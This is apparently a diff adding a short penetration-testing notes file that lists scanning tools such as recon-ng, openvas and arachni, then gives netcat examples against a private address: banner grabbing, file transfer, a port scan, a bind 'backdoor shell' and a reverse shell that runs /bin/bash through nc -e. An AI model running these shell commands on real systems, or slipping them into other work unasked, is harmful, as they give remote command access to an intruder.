@@ -1,0 +1,33 @@
+recon-ng
+openvas
+nexpose
+golismero
+arachni
+BlindElephant
+netcat
+nc
+  example:
+  1). nc 192.168.0.117 22
+  2). echo -e "HEAD / HTTP/1.0\n\n" | nc 192.168.0.117 80
+  3). server: 
+        nc -l -p 1234
+      client:
+        telnet 192.168.0.117 1234
+  4). server:
+        nc -l -p 1234 > file.out
+      client:
+        nc -w3 192.168.0.117 1234 < thefile
+      notes:
+        -w secs timeout for connects and final net reads
+  5). nc -n -v -z -w 1 192.168.0.117 1-1000
+  6). backdoor shell
+      Server:
+      nc -e /bin/bash -l -p 1234
+      Client:
+       telnet 192.168.0.117 1234
+  7). reverse shell
+      Client:
+        nc -n -v -l -p 1234
+      Server:
+        nc -e /bin/bash 192.168.0.117 1234
+       
